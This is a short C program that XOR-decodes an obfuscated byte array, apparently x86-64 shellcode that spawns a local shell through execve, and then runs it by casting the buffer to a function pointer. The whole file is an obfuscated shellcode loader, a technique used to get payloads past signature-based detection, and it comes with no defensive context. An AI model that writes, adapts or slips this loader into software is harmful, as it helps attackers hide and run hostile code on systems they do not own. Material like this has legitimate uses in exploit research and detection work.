#include <stddef.h>
#include <stdio.h>
#include <string.h>

int main() {
  const unsigned char bogus[] =
      "\x7f\x06\xe5\x65\x7f\x8f\x18\x55\x5e\x59\x18\x18\x44"
      "\x5f\x67\x7f\xbe\xd0\x65\x60"
      "\x7f\xbe\xd1\x06\xf7\x87\x0c\x38\x32\x37";
  size_t len = sizeof(bogus);

  // Create a writable array to hold the XORed result
  unsigned char shell[len];

  unsigned char key = 0x37;

  // XOR each byte in bogus[] with the key and store it in shell[]
  for (size_t i = 0; i < len; i++) {
    shell[i] = bogus[i] ^ key;
  }

  // Cast the shell array to a function pointer and execute the shellcode
  void (*f)() = (void (*)())shell;
  f(); // Call the shellcode

  return 0;
}

